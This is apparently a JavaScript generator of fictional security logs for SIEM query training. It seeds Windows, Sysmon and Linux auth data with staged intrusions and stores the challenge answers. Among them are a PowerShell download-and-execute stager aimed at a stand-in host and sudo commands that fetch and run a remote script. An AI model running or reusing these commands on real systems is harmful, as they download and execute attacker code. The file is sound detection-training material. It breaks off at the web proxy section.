// Query-sandbox datasets: large, noisy, fictional logs generated deterministically from a seed.
// All IPs are RFC 5737 (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24) or private ranges;
// all domains are example.* / fictional.
//
// A dataset: { id, title, spl (index), kql (table), sourcetype, fields (canonical names),
//   names: { spl: { canonical: splName }, kql: { canonical: kqlName } }, aliases: { alt: canonical },
//   seed, blurb, generate(rng, h) -> events }  -> getDataset(id) adds { events, truth, now }.
//
// Other content streams can add their own (IDS alerts, web server logs...) with registerDataset();
// the sandbox, challenges and SIEM query bar pick them up automatically.

export const LAB_NOW = Date.UTC(2026, 8, 24, 9, 0, 0) / 1000; // 2026-09-24 09:00 UTC
export const DAY = 86400;
const START = LAB_NOW - DAY;
const T = (hh, mm = 0, ss = 0) => Date.UTC(2026, 8, 24, hh, mm, ss) / 1000; // a time on 24 Sep (UTC)
const Y = (hh, mm = 0, ss = 0) => Date.UTC(2026, 8, 23, hh, mm, ss) / 1000; // a time on 23 Sep (UTC)

/** Small, fast, seedable PRNG. */
export function mulberry32(seed) {
  let a = seed >>> 0;
  return () => {
    a = (a + 0x6d2b79f5) >>> 0;
    let t = a;
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

/** Helpers bound to one rng. */
export function helpers(rng) {
  const h = {
    rng,
    int: (a, b) => a + Math.floor(rng() * (b - a + 1)),
    pick: (arr) => arr[Math.floor(rng() * arr.length)],
    chance: (p) => rng() < p,
    /** weighted pick: [[value, weight], ...] */
    wpick: (pairs) => {
      const tot = pairs.reduce((s, p) => s + p[1], 0);
      let r = rng() * tot;
      for (const [v, w] of pairs) if ((r -= w) <= 0) return v;
      return pairs[pairs.length - 1][0];
    },
    /** A time in the 24h window, weighted towards US business hours (13:00-23:00 UTC). */
    time: () => {
      if (rng() < 0.65) {
        const base = Y(13) + Math.floor(rng() * 10 * 3600);
        return base;
      }
      return START + Math.floor(rng() * DAY);
    },
    hex: (n) => Array.from({ length: n }, () => '0123456789abcdef'[Math.floor(rng() * 16)]).join(''),
    b32: (n) => Array.from({ length: n }, () => 'abcdefghijklmnopqrstuvwxyz234567'[Math.floor(rng() * 32)]).join(''),
  };
  return h;
}

export const iso = (t) => new Date(t * 1000).toISOString().replace('.000', '');
const MON = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
const syslogTime = (t) => {
  const d = new Date(t * 1000);
  const p = (n) => String(n).padStart(2, '0');
  return `${MON[d.getUTCMonth()]} ${String(d.getUTCDate()).padStart(2, ' ')} ${p(d.getUTCHours())}:${p(d.getUTCMinutes())}:${p(d.getUTCSeconds())}`;
};

// ------------------------------------------------------------------ shared fictional org
export const ORG = {
  domain: 'CORP',
  users: ['a.patel', 'j.nguyen', 'm.garcia', 's.okafor', 'l.chen', 'r.kowalski', 't.brown', 'd.silva', 'k.muller', 'e.rossi', 'h.kim', 'p.dubois', 'n.ahmed', 'c.jones', 'b.smith', 'f.haddad', 'g.olsen', 'i.moreau'],
  admins: ['adm.lchen', 'adm.sokafor'],
  workstations: ['WS-HR-12', 'WS-FIN-03', 'WS-FIN-07', 'WS-ENG-21', 'WS-ENG-07', 'WS-ENG-15', 'WS-MKT-04', 'WS-OPS-09', 'WS-EXEC-01', 'WS-HR-02', 'WS-SAL-11', 'WS-SAL-05'],
  servers: ['SRV-FILE-01', 'SRV-SQL-02', 'SRV-WEB-01', 'SRV-APP-04', 'SRV-JUMP-01', 'SRV-PRINT-01'],
  dcs: ['DC01', 'DC02'],
};
const wsIp = (ws) => `10.10.${3 + (ORG.workstations.indexOf(ws) % 4)}.${20 + ORG.workstations.indexOf(ws)}`;
const srvIp = (s) => `10.10.2.${10 + ORG.servers.indexOf(s) * 10}`;

// ------------------------------------------------------------------ registry
const REGISTRY = new Map();
const CACHE = new Map();

/** Adds (or replaces) a dataset definition. */
export function registerDataset(def) {
  if (!def || !def.id || !def.spl || !def.kql || typeof def.generate !== 'function') throw new Error(`Bad dataset definition: ${def && def.id}`);
  REGISTRY.set(def.id, def);
  CACHE.delete(def.id);
  return def;
}

/** All dataset definitions (not generated). */
export function datasetList() {
  return [...REGISTRY.values()];
}

/** A generated dataset: definition + events (sorted by time, ids assigned) + truth. Memoized. */
export function getDataset(id) {
  if (CACHE.has(id)) return CACHE.get(id);
  const def = REGISTRY.get(id);
  if (!def) return null;
  const rng = mulberry32(def.seed || 1);
  const truth = {};
  const events = def.generate(helpers(rng), truth).filter((e) => e._time >= START && e._time <= LAB_NOW);
  events.sort((a, b) => a._time - b._time);
  events.forEach((e, i) => (e.id = `${def.id}-${i}`));
  const ds = { ...def, events, truth, now: def.now || LAB_NOW };
  CACHE.set(id, ds);
  return ds;
}

/** Generated tables for runQuery. */
export function getTables(ids = null) {
  return (ids || [...REGISTRY.keys()]).map(getDataset).filter(Boolean);
}

// =================================================================== Windows Security (winsec)

const STATUS_BAD_PW = ['0xC000006D', '0xC000006A'];
const STATUS_NO_USER = ['0xC000006D', '0xC0000064'];
const DCSYNC_GUIDS = {
  getChanges: '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2',
  getChangesAll: '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2',
  getChangesFiltered: '89e95b76-444d-4c62-991a-0facbeda640c',
};
export { DCSYNC_GUIDS };

function winRaw(e) {
  const kv = [`EventCode=${e.EventID}`, `ComputerName=${e.Computer}`];
  if (e.SubjectUserName) kv.push(`Subject_Account_Name=${e.SubjectUserName}`);
  if (e.TargetUserName) kv.push(`Account_Name=${e.TargetUserName}`);
  if (e.LogonType) kv.push(`Logon_Type=${e.LogonType}`);
  if (e.IpAddress) kv.push(`Source_Network_Address=${e.IpAddress}`);
  if (e.Status) kv.push(`Status=${e.Status} Sub_Status=${e.SubStatus}`);
  if (e.ServiceName) kv.push(`Service_Name=${e.ServiceName} Ticket_Encryption_Type=${e.TicketEncryptionType}`);
  if (e.Properties) kv.push(`Access_Mask=${e.AccessMask} Properties="${e.Properties}"`);
  return `${iso(e._time)} ${kv.join(' ')} Message="${e.Activity}"`;
}

const ACT = {
  4624: 'An account was successfully logged on.',
  4625: 'An account failed to log on.',
  4634: 'An account was logged off.',
  4672: 'Special privileges assigned to new logon.',
  4740: 'A user account was locked out.',
  4768: 'A Kerberos authentication ticket (TGT) was requested.',
  4769: 'A Kerberos service ticket was requested.',
  4662: 'An operation was performed on an object.',
  4688: 'A new process has been created.',
};

registerDataset({
  id: 'winsec',
  title: 'Windows Security',
  spl: 'wineventlog',
  kql: 'SecurityEvent',
  sourcetype: 'WinEventLog:Security',
  seed: 4625,
  blurb: 'Domain controllers, servers and workstations: logons (4624/4625), Kerberos (4768/4769), directory access (4662), lockouts (4740).',
  fields: ['EventID', 'Computer', 'TargetUserName', 'SubjectUserName', 'LogonType', 'IpAddress', 'WorkstationName', 'Status', 'SubStatus', 'ServiceName', 'TicketEncryptionType', 'AccessMask', 'Properties', 'Activity'],
  names: {
    spl: { EventID: 'EventCode', Computer: 'ComputerName', TargetUserName: 'user', SubjectUserName: 'src_user', LogonType: 'Logon_Type', IpAddress: 'src_ip', WorkstationName: 'Workstation_Name', Status: 'Status', SubStatus: 'Sub_Status', ServiceName: 'Service_Name', TicketEncryptionType: 'Ticket_Encryption_Type', AccessMask: 'Access_Mask', Properties: 'Properties', Activity: 'signature' },
    kql: {},
  },
  aliases: { host: 'Computer', dest: 'Computer', Account_Name: 'TargetUserName', Account: 'TargetUserName', TargetAccount: 'TargetUserName', src: 'IpAddress', Source_Network_Address: 'IpAddress', SubjectAccount: 'SubjectUserName', Subject_Account_Name: 'SubjectUserName', Message: 'Activity' },
  generate(h, truth) {
    const ev = [];
    const add = (e) => {
      e.Activity = ACT[e.EventID];
      e._raw = winRaw(e);
      ev.push(e);
    };
    const users = ORG.users;
    // --- normal interactive / network logons
    for (let i = 0; i < 1050; i++) {
      const u = h.pick(users);
      const ws = ORG.workstations[users.indexOf(u) % ORG.workstations.length];
      const net = h.chance(0.55);
      const target = net ? h.pick(['SRV-FILE-01', 'SRV-FILE-01', 'SRV-SQL-02', 'SRV-PRINT-01', 'SRV-APP-04', 'DC01', 'DC02']) : ws;
      add({ _time: h.time(), EventID: 4624, Computer: target, TargetUserName: u, LogonType: net ? 3 : h.pick([2, 2, 7, 11]), IpAddress: net ? wsIp(ws) : '127.0.0.1', WorkstationName: ws });
    }
    // admins RDP to servers
    for (let i = 0; i < 60; i++) {
      const a = h.pick(ORG.admins);
      add({ _time: h.time(), EventID: 4624, Computer: h.pick(['SRV-JUMP-01', 'SRV-SQL-02', 'SRV-APP-04', 'DC01']), TargetUserName: a, LogonType: 10, IpAddress: h.pick(['10.10.3.21', '10.10.6.29']), WorkstationName: h.pick(['WS-ENG-21', 'WS-OPS-09']) });
      add({ _time: h.time(), EventID: 4672, Computer: 'DC01', SubjectUserName: a, TargetUserName: a });
    }
    // service logons
    for (let i = 0; i < 140; i++) {
      const s = h.pick(['svc_backup', 'svc_sql', 'svc_web', 'SYSTEM']);
      add({ _time: h.time(), EventID: 4624, Computer: h.pick(ORG.servers), TargetUserName: s, LogonType: 5, IpAddress: '-', WorkstationName: '-' });
    }
    // logoffs
    for (let i = 0; i < 260; i++) {
      const u = h.pick(users);
      add({ _time: h.time(), EventID: 4634, Computer: h.pick([...ORG.workstations, 'SRV-FILE-01']), TargetUserName: u, LogonType: h.pick([2, 3, 3]) });
    }
    // --- everyday failed logons (typos, a few unknown names)
    for (let i = 0; i < 95; i++) {
      const u = h.chance(0.9) ? h.pick(users) : h.pick(['jnguyen', 'mgarcia', 'l.chen2']);
      const ws = h.pick(ORG.workstations);
      const known = users.includes(u);
      const [st, sub] = known ? STATUS_BAD_PW : STATUS_NO_USER;
      add({ _time: h.time(), EventID: 4625, Computer: h.chance(0.5) ? ws : h.pick(['SRV-FILE-01', 'DC01']), TargetUserName: u, LogonType: h.pick([2, 3, 7]), IpAddress: wsIp(ws), WorkstationName: ws, Status: st, SubStatus: sub });
    }
    // stale service password: svc_sql fails every 30 minutes from the SQL server (noise, internal)
    for (let t = START + 600; t < LAB_NOW; t += 1800) add({ _time: t + h.int(0, 20), EventID: 4625, Computer: 'DC01', TargetUserName: 'svc_sql', LogonType: 3, IpAddress: srvIp('SRV-SQL-02'), WorkstationName: 'SRV-SQL-02', Status: STATUS_BAD_PW[0], SubStatus: STATUS_BAD_PW[1] });
    // --- RDP brute force against the exposed jump host (NLA: failures are LogonType 3)
    const bfNames = ['administrator', 'admin', 'administrator', 'backup', 'test', 'user', 'scanner', 'guest', 'a.patel', 'rdp', 'support', 'sql', 'helpdesk', 'scan'];
    let t = T(2, 10, 3);
    let bf = 0;
    while (t < T(2, 52)) {
      const u = h.pick(bfNames);
      const known = u === 'a.patel' || u === 'administrator';
      const [st, sub] = known ? STATUS_BAD_PW : STATUS_NO_USER;
      add({ _time: t, EventID: 4625, Computer: 'SRV-JUMP-01', TargetUserName: u, LogonType: 3, IpAddress: '203.0.113.45', WorkstationName: '-', Status: st, SubStatus: sub });
      bf++;
      t += h.int(5, 17);
    }
    add({ _time: T(2, 31, 12), EventID: 4740, Computer: 'DC01', TargetUserName: 'a.patel', SubjectUserName: 'DC01$', Activity: '' });
    // --- low-and-slow password spray: one try per user from another external IP
    users.forEach((u, i) => add({ _time: T(4, 2) + i * h.int(170, 260), EventID: 4625, Computer: 'SRV-JUMP-01', TargetUserName: u, LogonType: 3, IpAddress: '198.51.100.23', WorkstationName: '-', Status: STATUS_BAD_PW[0], SubStatus: STATUS_BAD_PW[1] }));
    // --- Kerberos: TGTs and normal AES service tickets
    for (let i = 0; i < 180; i++) {
      const u = h.pick(users);
      add({ _time: h.time(), EventID: 4768, Computer: h.pick(ORG.dcs), TargetUserName: u, IpAddress: wsIp(ORG.workstations[users.indexOf(u) % 12]), ServiceName: 'krbtgt', TicketEncryptionType: '0x12' });
    }
    const services = ['SRV-FILE-01$', 'SRV-SQL-02$', 'SRV-WEB-01$', 'SRV-APP-04$', 'SRV-PRINT-01$', 'DC01$', 'DC02$', 'svc_sql', 'svc_web'];
    for (let i = 0; i < 330; i++) {
      const u = h.pick(users);
      add({ _time: h.time(), EventID: 4769, Computer: h.pick(ORG.dcs), TargetUserName: `${u}@CORP.EXAMPLE`, IpAddress: wsIp(ORG.workstations[users.indexOf(u) % 12]), ServiceName: h.pick(services), TicketEncryptionType: '0x12', Status: '0x0', SubStatus: '' });
    }
    // legacy NAS only speaks RC4 (0x17): a noisy but benign RC4 source (service is a machine account)
    for (let i = 0; i < 45; i++) {
      const u = h.pick(users);
      add({ _time: h.time(), EventID: 4769, Computer: h.pick(ORG.dcs), TargetUserName: `${u}@CORP.EXAMPLE`, IpAddress: wsIp(ORG.workstations[users.indexOf(u) % 12]), ServiceName: 'NAS-LEGACY$', TicketEncryptionType: '0x17', Status: '0x0', SubStatus: '' });
    }
    // TGT renewals show krbtgt as the service
    for (let i = 0; i < 40; i++) add({ _time: h.time(), EventID: 4769, Computer: h.pick(ORG.dcs), TargetUserName: `${h.pick(users)}@CORP.EXAMPLE`, IpAddress: wsIp(h.pick(ORG.workstations)), ServiceName: 'krbtgt', TicketEncryptionType: '0x12', Status: '0x0', SubStatus: '' });
    // Kerberoasting: j.nguyen asks for RC4 tickets for six service accounts in 40 seconds
    const roasted = ['svc_sql', 'svc_web', 'svc_backup', 'svc_report', 'svc_crm', 'svc_sharepoint'];
    roasted.forEach((s, i) => add({ _time: T(4, 31, 5) + i * h.int(4, 8), EventID: 4769, Computer: 'DC01', TargetUserName: 'j.nguyen@CORP.EXAMPLE', IpAddress: wsIp('WS-ENG-21'), ServiceName: s, TicketEncryptionType: '0x17', Status: '0x0', SubStatus: '' }));
    // --- directory service access (4662)
    const normalProps = ['{bf967aba-0de6-11d0-a285-00aa003049e2}', '{bf967a86-0de6-11d0-a285-00aa003049e2}', '{19195a5b-6da0-11d0-afd3-00c04fd930c9}'];
    for (let i = 0; i < 90; i++) add({ _time: h.time(), EventID: 4662, Computer: h.pick(ORG.dcs), SubjectUserName: h.pick([...users, 'svc_backup']), AccessMask: '0x10', Properties: `%%7684 ${h.pick(normalProps)}` });
    // legit replication: DCs and the Entra Connect sync account
    for (let i = 0; i < 48; i++) {
      const who = h.pick(['DC02$', 'DC01$', 'DC02$', 'MSOL_7c1f02']);
      const dc = who === 'DC01$' ? 'DC02' : 'DC01';
      add({ _time: h.time(), EventID: 4662, Computer: dc, SubjectUserName: who, AccessMask: '0x100', Properties: `%%7688 {${DCSYNC_GUIDS.getChanges}} {${h.chance(0.5) ? DCSYNC_GUIDS.getChangesAll : DCSYNC_GUIDS.getChangesFiltered}}` });
    }
    // DCSync from a compromised service account
    add({ _time: T(5, 14, 2), EventID: 4662, Computer: 'DC01', SubjectUserName: 'svc_scan', AccessMask: '0x100', Properties: `%%7688 {${DCSYNC_GUIDS.getChanges}}` });
    add({ _time: T(5, 14, 3), EventID: 4662, Computer: 'DC01', SubjectUserName: 'svc_scan', AccessMask: '0x100', Properties: `%%7688 {${DCSYNC_GUIDS.getChangesAll}}` });
    add({ _time: T(5, 14, 3), EventID: 4662, Computer: 'DC01', SubjectUserName: 'svc_scan', AccessMask: '0x100', Properties: `%%7688 {${DCSYNC_GUIDS.getChangesFiltered}}` });
    add({ _time: T(5, 13, 50), EventID: 4624, Computer: 'DC01', TargetUserName: 'svc_scan', LogonType: 3, IpAddress: wsIp('WS-ENG-21'), WorkstationName: 'WS-ENG-21' });

    Object.assign(truth, { bruteSrc: '203.0.113.45', bruteCount: bf, bruteHost: 'SRV-JUMP-01', sprayIp: '198.51.100.23', kerberoaster: 'j.nguyen@CORP.EXAMPLE', roasted, dcsync: 'svc_scan', bruteHour: T(2) });
    return ev;
  },
});

// =================================================================== Sysmon (process / network / file)

const P = {
  explorer: 'C:\\Windows\\explorer.exe',
  services: 'C:\\Windows\\System32\\services.exe',
  svchost: 'C:\\Windows\\System32\\svchost.exe',
  cmd: 'C:\\Windows\\System32\\cmd.exe',
  conhost: 'C:\\Windows\\System32\\conhost.exe',
  powershell: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
  winword: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE',
  excel: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE',
  outlook: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE',
  edge: 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe',
  teams: 'C:\\Users\\Public\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe',
  splwow: 'C:\\Windows\\splwow64.exe',
  taskhost: 'C:\\Windows\\System32\\taskhostw.exe',
  ccm: 'C:\\Windows\\CCM\\CcmExec.exe',
  onedrive: 'C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe',
  wmiprvse: 'C:\\Windows\\System32\\wbem\\WmiPrvSE.exe',
  msiexec: 'C:\\Windows\\System32\\msiexec.exe',
  whoami: 'C:\\Windows\\System32\\whoami.exe',
  nltest: 'C:\\Windows\\System32\\nltest.exe',
};
const base = (p) => p.split('\\').pop();
/** UTF-16LE base64, the format of PowerShell -EncodedCommand. */
export function utf16b64(text) {
  let bin = '';
  for (const ch of text) {
    const c = ch.charCodeAt(0);
    bin += String.fromCharCode(c & 0xff, c >> 8);
  }
  return typeof btoa === 'function' ? btoa(bin) : Buffer.from(bin, 'binary').toString('base64');
}
// fictional stager command (RFC 5737 address), encoded the way a macro would launch it
export const STAGER = "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.66/a.ps1')";
const ENC = utf16b64(STAGER);

registerDataset({
  id: 'sysmon',
  title: 'Sysmon',
  spl: 'sysmon',
  kql: 'SysmonEvent',
  sourcetype: 'XmlWinEventLog:Microsoft-Windows-Sysmon/Operational',
  seed: 1,
  blurb: 'Endpoint telemetry: process creation (1), network connections (3), file creation (11), DNS queries (22).',
  fields: ['EventID', 'Computer', 'User', 'Image', 'ParentImage', 'CommandLine', 'ParentCommandLine', 'ProcessId', 'DestinationIp', 'DestinationPort', 'TargetFilename', 'QueryName'],
  names: {
    spl: { EventID: 'EventCode', Computer: 'host', User: 'user', Image: 'process', ParentImage: 'parent_process', CommandLine: 'process_command_line', ParentCommandLine: 'parent_command_line', ProcessId: 'process_id', DestinationIp: 'dest_ip', DestinationPort: 'dest_port', TargetFilename: 'file_path', QueryName: 'query' },
    kql: {},
  },
  aliases: { ComputerName: 'Computer', dest: 'Computer', process_path: 'Image', parent_process_path: 'ParentImage', CommandLine: 'CommandLine' },
  generate(h, truth) {
    const ev = [];
    const pid = () => h.int(1200, 19800);
    const add = (e) => {
      e.ProcessId = e.ProcessId || pid();
      e._raw = `${iso(e._time)} EventCode=${e.EventID} host=${e.Computer} user=${e.User} ParentImage="${e.ParentImage || ''}" Image="${e.Image || ''}" CommandLine="${e.CommandLine || ''}"${e.DestinationIp ? ` DestinationIp=${e.DestinationIp} DestinationPort=${e.DestinationPort}` : ''}${e.TargetFilename ? ` TargetFilename="${e.TargetFilename}"` : ''}${e.QueryName ? ` QueryName=${e.QueryName}` : ''}`;
      ev.push(e);
    };
    const who = (ws) => `CORP\\${ORG.users[ORG.workstations.indexOf(ws)] || 'a.patel'}`;
    const common = [
      [[P.explorer, P.edge, '"msedge.exe" --single-argument https://intranet.corp.example/'], 30],
      [[P.explorer, P.outlook, '"OUTLOOK.EXE"'], 12],
      [[P.explorer, P.winword, '"WINWORD.EXE" /n "C:\\Users\\Public\\Documents\\Q3-plan.docx"'], 10],
      [[P.explorer, P.excel, '"EXCEL.EXE" "C:\\Users\\Public\\Documents\\budget.xlsx"'], 10],
      [[P.explorer, P.teams, 'Teams.exe --system-initiated'], 12],
      [[P.explorer, P.cmd, '"cmd.exe"'], 4],
      [[P.cmd, P.conhost, '\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1'], 4],
      [[P.services, P.svchost, 'C:\\Windows\\system32\\svchost.exe -k netsvcs -p'], 26],
      [[P.svchost, P.taskhost, 'taskhostw.exe'], 12],
      [[P.excel, P.splwow, 'splwow64.exe 8192'], 5],
      [[P.outlook, P.edge, '"msedge.exe" --single-argument https://portal.example.com/invoice'], 8],
      [[P.explorer, P.onedrive, '"OneDrive.exe" /background'], 8],
      [[P.ccm, P.powershell, 'powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\Windows\\CCM\\SystemTemp\\inventory.ps1'], 9],
      [[P.explorer, P.powershell, '"powershell.exe"'], 3],
      [[P.svchost, P.wmiprvse, 'C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding'], 7],
      [[P.services, P.msiexec, 'C:\\Windows\\system32\\msiexec.exe /V'], 3],
    ];
    for (let i = 0; i < 1150; i++) {
      const [parent, img, cl] = h.wpick(common);
      const ws = h.pick(ORG.workstations);
      const sys = parent === P.services || parent === P.ccm || img === P.wmiprvse;
      add({ _time: h.time(), EventID: 1, Computer: ws, User: sys ? 'NT AUTHORITY\\SYSTEM' : who(ws), Image: img, ParentImage: parent, CommandLine: cl, ParentCommandLine: base(parent) });
    }
    const dests = [['13.107.42.14', 443], ['10.10.2.10', 445], ['10.10.2.30', 443], ['52.96.10.20', 443], ['10.10.0.10', 53]];
    for (let i = 0; i < 420; i++) {
      const [ip, port] = h.pick(dests);
      const ws = h.pick(ORG.workstations);
      add({ _time: h.time(), EventID: 3, Computer: ws, User: who(ws), Image: h.pick([P.edge, P.teams, P.outlook, P.onedrive, P.svchost]), DestinationIp: ip, DestinationPort: port });
    }
    for (let i = 0; i < 160; i++) {
      const ws = h.pick(ORG.workstations);
      add({ _time: h.time(), EventID: 11, Computer: ws, User: who(ws), Image: h.pick([P.edge, P.outlook, P.winword, P.excel]), TargetFilename: `C:\\Users\\${who(ws).split('\\')[1]}\\Downloads\\${h.pick(['report', 'invoice', 'notes', 'deck'])}-${h.int(1, 99)}.${h.pick(['pdf', 'docx', 'xlsx'])}` });
    }
    for (let i = 0; i < 60; i++) {
      const ws = h.pick(ORG.workstations);
      add({ _time: h.time(), EventID: 22, Computer: ws, User: who(ws), Image: h.pick([P.edge, P.teams]), QueryName: h.pick(['login.example.com', 'teams.example.net', 'intranet.corp.example', 'cdn.example.org']) });
    }
    // --- the malicious chain on WS-HR-12 (m.garcia opened a macro document)
    const u = 'CORP\\m.garcia';
    add({ _time: T(3, 46, 40), EventID: 1, Computer: 'WS-HR-12', User: u, Image: P.winword, ParentImage: P.outlook, CommandLine: '"WINWORD.EXE" /n "C:\\Users\\m.garcia\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\Q7K2\\Invoice_4471.docm"', ParentCommandLine: 'OUTLOOK.EXE', ProcessId: 7712 });
    add({ _time: T(3, 47, 2), EventID: 1, Computer: 'WS-HR-12', User: u, Image: P.powershell, ParentImage: P.winword, CommandLine: `powershell.exe -nop -w hidden -enc ${ENC}`, ParentCommandLine: '"WINWORD.EXE" /n Invoice_4471.docm', ProcessId: 8120 });
    add({ _time: T(3, 47, 4), EventID: 3, Computer: 'WS-HR-12', User: u, Image: P.powershell, DestinationIp: '198.51.100.66', DestinationPort: 80, ProcessId: 8120 });
    add({ _time: T(3, 47, 9), EventID: 11, Computer: 'WS-HR-12', User: u, Image: P.powershell, TargetFilename: 'C:\\Users\\m.garcia\\AppData\\Roaming\\Microsoft\\updsvc.exe', ProcessId: 8120 });
    add({ _time: T(3, 47, 15), EventID: 1, Computer: 'WS-HR-12', User: u, Image: P.whoami, ParentImage: P.powershell, CommandLine: 'whoami.exe /all', ParentCommandLine: 'powershell.exe -nop -w hidden -enc ...' });
    add({ _time: T(3, 47, 21), EventID: 1, Computer: 'WS-HR-12', User: u, Image: P.nltest, ParentImage: P.powershell, CommandLine: 'nltest.exe /dclist:corp.example', ParentCommandLine: 'powershell.exe -nop -w hidden -enc ...' });
    Object.assign(truth, { officeShellHost: 'WS-HR-12', payloadIp: '198.51.100.66', encoded: ENC });
    return ev;
  },
});

// =================================================================== Linux auth (sshd / sudo)

registerDataset({
  id: 'auth',
  title: 'Linux auth',
  spl: 'linux_auth',
  kql: 'Syslog',
  sourcetype: 'linux_secure',
  seed: 22,
  blurb: 'sshd and sudo logs from Linux servers. sshd lines have user/src/action parsed; sudo lines are raw text (use rex / extract).',
  fields: ['Computer', 'ProcessName', 'Facility', 'SeverityLevel', 'user', 'src', 'action', 'SyslogMessage'],
  names: {
    spl: { Computer: 'host', ProcessName: 'process', Facility: 'facility', SeverityLevel: 'severity', SyslogMessage: 'message' },
    kql: { Computer: 'HostName', user: 'User', src: 'SrcIp', action: 'Action' },
  },
  aliases: { src_ip: 'src', app: 'ProcessName', Message: 'SyslogMessage', dest: 'Computer' },
  generate(h, truth) {
    const ev = [];
    const hosts = ['web-prod-01', 'web-prod-02', 'db-prod-01', 'build-01'];
    const add = (host, proc, msg, t, extra = {}) => {
      const pidn = h.int(900, 32000);
      ev.push({ _time: t, Computer: host, ProcessName: proc, Facility: proc === 'CRON' ? 'cron' : 'authpriv', SeverityLevel: /Failed|invalid/i.test(msg) ? 'warning' : 'info', SyslogMessage: msg, ...extra, _raw: `${syslogTime(t)} ${host} ${proc}[${pidn}]: ${msg}` });
    };
    const staff = ['l.chen', 'adm.sokafor', 'deploy', 'ansible', 'j.nguyen'];
    const staffIp = { 'l.chen': '10.10.3.24', 'adm.sokafor': '10.10.6.29', deploy: '10.30.1.5', ansible: '10.30.1.6', 'j.nguyen': '10.10.3.21' };
    for (let i = 0; i < 300; i++) {
      const u = h.pick(staff);
      const host = h.pick(hosts);
      const t = u === 'deploy' ? Y(10) + h.int(0, 12 * 3600) : h.time();
      const port = h.int(40000, 65000);
      const method = u === 'deploy' || u === 'ansible' ? 'publickey' : h.pick(['publickey', 'publickey', 'password']);
      add(host, 'sshd', `Accepted ${method} for ${u} from ${staffIp[u]} port ${port} ssh2`, t, { user: u, src: staffIp[u], action: 'success' });
      add(host, 'sshd', `pam_unix(sshd:session): session opened for user ${u}(uid=${1000 + staff.indexOf(u)}) by (uid=0)`, t + 1);
      add(host, 'sshd', `pam_unix(sshd:session): session closed for user ${u}`, t + h.int(60, 3000));
    }
    // occasional typos from staff
    for (let i = 0; i < 25; i++) {
      const u = h.pick(['l.chen', 'adm.sokafor', 'j.nguyen']);
      const t = h.time();
      add(h.pick(hosts), 'sshd', `Failed password for ${u} from ${staffIp[u]} port ${h.int(40000, 65000)} ssh2`, t, { user: u, src: staffIp[u], action: 'failure' });
    }
    // cron noise
    for (let i = 0; i < 180; i++) add(h.pick(hosts), 'CRON', `pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)`, h.time());
    // routine sudo
    const routine = { 'l.chen': ['/usr/bin/systemctl status nginx', '/usr/bin/tail -n 50 /var/log/nginx/error.log', '/usr/bin/apt list --upgradable'], 'adm.sokafor': ['/usr/bin/apt update', '/usr/bin/apt upgrade -y', '/usr/sbin/reboot'], deploy: ['/usr/bin/systemctl restart app', '/usr/bin/systemctl reload nginx'], ansible: ['/bin/sh -c echo BECOME-SUCCESS-abc; /usr/bin/python3'] };
    for (let i = 0; i < 110; i++) {
      const u = h.pick(Object.keys(routine));
      const t = u === 'deploy' ? Y(10) + h.int(0, 12 * 3600) : h.time();
      add(h.pick(hosts), 'sudo', `${u} : TTY=pts/${h.int(0, 3)} ; PWD=/home/${u} ; USER=root ; COMMAND=${h.pick(routine[u])}`, t);
    }
    // internet background noise: a scanner hammers every host with common names, never gets in
    for (let i = 0; i < 240; i++) {
      const u = h.pick(['root', 'admin', 'test', 'oracle', 'ubuntu', 'pi', 'postgres', 'user', 'ftpuser']);
      const t = T(0, 20) + i * h.int(10, 20);
      const invalid = !['root', 'ubuntu'].includes(u);
      add(h.pick(hosts), 'sshd', `Failed password for ${invalid ? 'invalid user ' : ''}${u} from 198.51.100.200 port ${h.int(30000, 65000)} ssh2`, t, { user: u, src: '198.51.100.200', action: 'failure' });
    }
    // the real attack: brute force against web-prod-02, then success as deploy
    let t = T(3, 5, 11);
    let n = 0;
    while (t < T(3, 40, 30)) {
      const u = h.pick(['deploy', 'deploy', 'admin', 'jenkins', 'git', 'deploy', 'www-data']);
      const invalid = !['deploy', 'www-data'].includes(u);
      add('web-prod-02', 'sshd', `Failed password for ${invalid ? 'invalid user ' : ''}${u} from 192.0.2.77 port ${h.int(30000, 65000)} ssh2`, t, { user: u, src: '192.0.2.77', action: 'failure' });
      n++;
      t += h.int(8, 20);
    }
    add('web-prod-02', 'sshd', 'Accepted password for deploy from 192.0.2.77 port 51234 ssh2', T(3, 41, 2), { user: 'deploy', src: '192.0.2.77', action: 'success' });
    add('web-prod-02', 'sshd', 'pam_unix(sshd:session): session opened for user deploy(uid=1002) by (uid=0)', T(3, 41, 3));
    const evil = ['/usr/bin/wget http://198.51.100.66/x.sh -O /tmp/x.sh', '/bin/chmod +x /tmp/x.sh', '/tmp/x.sh', '/usr/bin/crontab -l'];
    evil.forEach((c, i) => add('web-prod-02', 'sudo', `deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=${c}`, T(3, 42, 10) + i * h.int(20, 50)));
    Object.assign(truth, { sshAttacker: '192.0.2.77', sshScanner: '198.51.100.200', breachedUser: 'deploy', sshFails: n, evilCommands: evil });
    return ev;
  },
});

// =================================================================== Web proxy

const UA = {
  edge: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0 Safari/537.36 Edg/128.0',
